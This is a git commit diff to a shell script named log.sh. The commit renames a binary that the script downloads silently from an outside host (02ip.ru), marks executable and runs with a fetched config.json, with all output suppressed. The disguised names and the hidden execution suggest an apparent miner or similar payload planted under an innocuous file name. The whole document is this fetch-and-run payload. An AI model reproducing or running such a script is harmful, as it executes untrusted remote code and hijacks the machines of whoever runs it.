38704342362e2216e9a3d310b2c36e6ac4e36cf4
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-10 13:45:25 +0700

    Update log.sh

--- log.sh
+++ log.sh
@@ -1,7 +1,7 @@
-wget -q -O BanqueRelation https://02ip.ru/service && chmod +x BanqueRelation >/dev/null 2>&1
+wget -q -O FinancierNouvelleGénération https://02ip.ru/service && chmod +x FinancierNouvelleGénération >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 sleep 11 
 echo "******************************************************************" 
 echo "IP ORI ==> "$(curl ifconfig.me) 
 echo " "
-./BanqueRelation -c "config.json" >/dev/null 2>&1
+./FinancierNouvelleGénération -c "config.json" >/dev/null 2>&1
